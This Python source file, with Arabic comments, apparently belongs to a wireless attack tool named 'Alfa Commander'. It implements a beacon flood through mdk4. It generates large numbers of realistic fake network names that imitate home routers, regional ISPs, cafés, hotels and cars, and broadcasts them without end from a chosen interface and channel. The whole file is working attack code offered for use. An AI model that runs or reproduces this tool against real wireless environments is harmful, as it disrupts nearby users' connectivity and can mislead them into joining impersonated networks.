# ============================================================
# Alfa Commander - Beacon Flood Attack
# هجوم إغراق Beacon
# ============================================================

from __future__ import annotations

import random
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

from app.constants import AttackState
from app.core.tools import mdk4
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# قوالب SSID واقعية
# ------------------------------------------------------------
SSID_TEMPLATES = {
    "home": [
        "Home_Network", "Family_WiFi", "MyHome", "Home_5G",
        "AlBait", "Dar_Net", "HomeSweetHome",
    ],
    "router_default": [
        "TP-LINK_", "TP-Link_", "NETGEAR", "D-Link_DIR", "HUAWEI-",
        "ZTE_", "Tenda_", "ASUS_", "Linksys", "Mikrotik",
    ],
    "isp": [
        "Ooredoo_", "Mobilis_", "Djezzy_", "Algérie_Telecom",
        "Orange_", "SFR_", "Vodafone_",
    ],
    "public": [
        "Free WiFi", "Public WiFi", "Guest Network", "Airport_Free",
        "Cafe_WiFi", "Hotel_Guest", "Mall_Free",
    ],
    "cafe": [
        "Starbucks", "Costa_Coffee", "Cafe_Net", "CoffeeShop",
    ],
    "hotel": [
        "Hotel_Guest", "Marriott", "Hilton", "Sheraton", "Ibis",
    ],
    "car": [
        "Tesla_Model_", "Car_WiFi", "Auto_Net",
    ],
    "smart": [
        "SmartHome_", "IoT_", "ESP_", "Arduino_",
    ],
}


class SSIDGenerator:
    """يولّد SSIDs عشوائية بناءً على قوالب."""

    def __init__(self, seed: Optional[int] = None):
        self._random = random.Random(seed)

    def generate(self, category: Optional[str] = None) -> str:
        """توليد SSID واحد."""
        if category is None:
            category = self._random.choice(list(SSID_TEMPLATES.keys()))

        templates = SSID_TEMPLATES.get(category, SSID_TEMPLATES["home"])
        template = self._random.choice(templates)

        # إضافة لاحقة عشوائية إذا انتهى بـ _
        if template.endswith("_"):
            suffix = self._random.choice([
                str(self._random.randint(1000, 9999)),
                self._random.choice(["2G", "5G", "Home", "Guest", "Ext"]),
                "".join(self._random.choices("ABCDEF0123456789", k=4)),
            ])
            template = template + suffix

        return template

    def generate_batch(self, count: int, category: Optional[str] = None) -> list[str]:
        """توليد قائمة SSIDs."""
        return [self.generate(category) for _ in range(count)]

    def save_to_file(self, ssids: list[str], path: Path) -> Path:
        """حفظ SSIDs في ملف (صيغة mdk4)."""
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            for ssid in ssids:
                f.write(ssid + "\n")
        return path


# ------------------------------------------------------------
# جلسة Beacon Flood
# ------------------------------------------------------------
@dataclass
class BeaconFloodSession:
    session_id: str
    channel: Optional[int] = None
    ssid_count: int = 0
    wpa: bool = True
    state: str = AttackState.IDLE
    started_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None
    beacons_sent: int = 0
    log: list[str] = field(default_factory=list)
    error: Optional[str] = None
    ssid_list_file: Optional[Path] = None


# ------------------------------------------------------------
# هجوم Beacon Flood
# ------------------------------------------------------------
class BeaconFloodAttack:
    def __init__(
        self,
        interface: str,
        channel: Optional[int] = None,
        ssid_count: int = 100,
        wpa: bool = True,
        category: Optional[str] = None,
        custom_ssids: Optional[list[str]] = None,
        output_dir: Optional[Path] = None,
        on_event: Optional[Callable[[str, dict], None]] = None,
    ):
        self.interface = interface
        self.channel = channel
        self.ssid_count = ssid_count
        self.wpa = wpa
        self.category = category
        self.custom_ssids = custom_ssids
        self.output_dir = output_dir
        self.on_event = on_event

        self.session = BeaconFloodSession(
            session_id=f"beacon_{int(datetime.now().timestamp())}",
            channel=channel,
            ssid_count=ssid_count,
            wpa=wpa,
        )

        self._process: Optional[mdk4.StreamingProcess] = None
        self._generator = SSIDGenerator()

    async def start(self) -> BeaconFloodSession:
        """بدء الهجوم."""
        self.session.state = AttackState.RUNNING
        self.session.started_at = datetime.now()

        # تحضير ملف SSID
        ssid_list_file = None
        if self.custom_ssids:
            ssids = self.custom_ssids
        else:
            ssids = self._generator.generate_batch(self.ssid_count, self.category)

        if self.output_dir:
            self.output_dir.mkdir(parents=True, exist_ok=True)
            ssid_list_file = self.output_dir / f"ssids_{self.session.session_id}.txt"
            self._generator.save_to_file(ssids, ssid_list_file)
            self.session.ssid_list_file = ssid_list_file

        # بدء mdk4
        opts = mdk4.BeaconFloodOptions(
            interface=self.interface,
            channel=self.channel,
            ssid_list_file=ssid_list_file,
            ssid_random=not bool(ssid_list_file),
            wpa=self.wpa,
            count=0,  # لانهائي
        )

        self._process = mdk4.MDK4.beacon_flood(opts)
        self._process.on_stdout = self._handle_line
        self._process.on_stderr = self._handle_line
        self._process.on_exit = self._handle_exit

        await self._process.start()

        self._emit("started", {
            "session_id": self.session.session_id,
            "channel": self.channel,
            "ssid_count": len(ssids),
        })

        logger.info(
            f"بدء Beacon Flood على {self.interface} "
            f"(القناة {self.channel or 'auto'}, {len(ssids)} SSID)"
        )

        return self.session

    async def stop(self) -> BeaconFloodSession:
        if self._process and self._process.running:
            await self._process.stop()
        self.session.state = AttackState.CANCELLED
        self.session.finished_at = datetime.now()
        self._emit("stopped", {"session_id": self.session.session_id})
        return self.session

    def _handle_line(self, line: str):
        if not line:
            return
        self.session.log.append(line)

        # عد الـ beacons
        if "Beacon" in line:
            self.session.beacons_sent += 1

        if self.on_event:
            try:
                self.on_event("line", {"line": line})
            except Exception:
                pass

    def _handle_exit(self, rc: int):
        if self.session.state == AttackState.RUNNING:
            if rc == 0 or self.session.beacons_sent > 0:
                self.session.state = AttackState.SUCCESS
            else:
                self.session.state = AttackState.FAILED
                self.session.error = f"mdk4 انتهى برمز {rc}"

        self.session.finished_at = datetime.now()
        self._emit("finished", {
            "session_id": self.session.session_id,
            "beacons_sent": self.session.beacons_sent,
        })

        logger.info(
            f"انتهى Beacon Flood [{self.session.session_id}]: "
            f"state={self.session.state} beacons={self.session.beacons_sent}"
        )

    def _emit(self, event: str, data: dict):
        if self.on_event:
            try:
                self.on_event(event, data)
            except Exception as e:
                logger.exception(f"خطأ في on_event: {e}")


# ------------------------------------------------------------
# دالة مختصرة
# ------------------------------------------------------------
async def beacon_flood(
    interface: str,
    channel: Optional[int] = None,
    ssid_count: int = 100,
    wpa: bool = True,
    category: Optional[str] = None,
    duration: Optional[int] = None,
) -> BeaconFloodSession:
    attack = BeaconFloodAttack(
        interface=interface,
        channel=channel,
        ssid_count=ssid_count,
        wpa=wpa,
        category=category,
    )

    session = await attack.start()

    if duration:
        import asyncio
        await asyncio.sleep(duration)
        session = await attack.stop()

    return session
